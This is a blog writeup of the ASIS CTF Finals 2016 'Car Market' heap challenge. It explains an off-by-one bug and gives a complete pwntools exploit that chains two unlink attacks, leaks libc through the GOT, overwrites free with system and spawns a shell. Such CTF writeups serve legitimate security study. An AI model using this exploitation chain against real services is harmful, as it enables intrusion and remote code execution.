---
layout: post
redirect_from:
  - /writeup/ctf/2016/asis-ctf-finals-2016-car-market/
  - /blog/2016/09/12/asis-ctf-finals-2016-car-market/
date: "2016-09-12T02:26:51+09:00"
tags: [ "ctf", "writeup", "asis-ctf", "pwn", "heap", "unlink-attack", "glibc" ]
---

# ASIS CTF Finals 2016: Car Market

Good problem.

## solution

A problem of heap, and the `malloc`/`free` are the ones of latest glibc.
Structures are below. There is a off-by-one, which the `name` of `customer_t` leaks the null byte and rewrites the least byte of `comment` with null.

``` c
car_t **g_cars = malloc(sizeof(car_t *) * 256);  // 0x6020c8
struct car_t {
    char name[16];  // 0x0
    int price;  // 0x10
    customer_t *customer;  // 0x18
}
struct customer_t {
    char firstname[32];  // 0x0
    char name[32];  // 0x20
    char *comment; // 0x40
}
```

There are `g_cars`, list of malloced pointes, so we can bypass the check `q->fd->bk == q` and `q->bk->fd == q` and do unlink attack.
See <https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c>.

However `x->customer` (used as `x->bk`) of a car pointer `x` is not our controll, so I did with $2$ steps.
At first, let `x->customer->comment` be a pointer of another car `y` (because `y` is on the list `g_cars`), `y->price` (`y->fd`) be the `g_cars + k` where `(g_cars + k)->bk == y`, and `*(y->customer + 0x10)` (`y->bk->fd`) be `y`.
Then free the `x` (and `x->customer`).
This causes use after free, so we can make a customer which is listed on the car list.
Secondly, do the similar thing and write the address the car list on the car list itself.
Now we can read/write arbitrary address, and get the flag.


## implementation

``` python
#!/usr/bin/env python2
import time
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='car-market.asis-ctf.ir')
parser.add_argument('port', nargs='?', default=31337, type=int)
args = parser.parse_args()
context.log_level = 'debug'

elf = ELF('./car_market')
libc = ELF('./libc.so.6') # ubuntu 16.04
p = remote(args.host, args.port)

def prompt(*xs):
    p.recvuntil('>\n')
    for x in xs:
        if isinstance(x, int):
            x = str(x)
        p.sendline(x)

# 1: list
# 2: add Car
# 3: remove car
# 4: select car
# 5: exit
list_cars = lambda: prompt(1)
add_car = lambda model, price: prompt(2, model, price)
remove_car = lambda index: prompt(3, index)
select_car = lambda index: prompt(4, index)
exit = lambda: prompt(5)

# 1: info
# 2: set model
# 3: set price
# 4: add customer
# 5: exit
info_car = lambda: prompt(1)
set_model = lambda s: prompt(2, s)
set_price = lambda s: prompt(3, s)
add_customer = lambda: prompt(4)
exit_car = lambda: prompt(5)

# 1: set name
# 2: set firstname
# 3: set comment
# 4: exit
set_name = lambda s: prompt(1, s)
set_firstname = lambda s: prompt(2, s)
set_comment = lambda s: prompt(3, s)
exit_customer = lambda: prompt(4)

for i in range(20):
    add_car(('car %d ' % i).ljust(15, 'X'), u32('YYYY'))
    select_car(i)
    if i != 11:
        add_customer()
        set_firstname(('customer %d' % i).ljust(0x20, 'A'))
        set_name('B' * 0x20)
        set_comment('C' * 0x48)
        exit_customer()
    exit_car()

# leak heap address
select_car(0)
add_customer()
set_firstname(('customer %d' % 0).ljust(0x20, 'A'))
set_name('B' * 0x20)
set_comment('C' * 0x48)
exit_customer()
info_car()
p.recvuntil('Name : ')
name = p.recvline(keepends=False)
heap_base = u64(name[0x20 :].ljust(8, '\0')) - 0x8a0
log.info('heap base: %#x', heap_base)
exit_car()
pointer_vector = lambda i: heap_base+0x10+i*8

# make fake chunks on a car
bk = 0x18
select_car(9)
set_price(pointer_vector(9) - bk)
add_customer()
set_firstname('A' * 16 + p64(heap_base + 0xf70))
set_comment(p64(0x80) + p64(0xc0))
exit_customer()
exit_car()

# first unlink
select_car(10)
add_customer()
set_comment('C')
set_name('B' * 0x20)
exit_customer()
add_customer() # free
exit_customer()
exit_car()

# make a customer who is listed on the pointer_vector, and make a fake chunk on it
fd = 0x10
bk = 0x18
select_car(11)
add_customer()
set_name('B' * 16 + p64(pointer_vector(9) - bk) + p64(pointer_vector(9) - fd))
exit_customer()
exit_car()

# make an another fake chunk
select_car(12)
add_customer()
set_comment('C' * 48 + p64(0x250) + p64(0x90))
exit_customer()
exit_car()

# second unlink
select_car(13)
add_customer()
set_comment('C')
set_name('B' * 0x20)
exit_customer()
add_customer() # free
exit_customer()
exit_car()

# read libc base
select_car(9)
set_model(p64(elf.got['setvbuf']))
exit_car()
select_car(6)
info_car()
p.recvuntil('Model  : ')
libc_base = u64(p.recvuntil(' \n')[: -2 ].ljust(8, '\0')) - libc.symbols['setvbuf']
log.info('libc base: %#x', libc_base)
exit_car()

# got overwrite
select_car(9)
set_model(p64(elf.got['free']))
exit_car()
select_car(6)
set_model(p64(libc_base + libc.symbols['system']).rstrip('\0'))
exit_car()

# set /bin/sh
select_car(9)
set_model('/bin/sh\0')
exit_car()

# run
remove_car(9)

time.sleep(1)
p.sendline('id')
p.interactive()
```
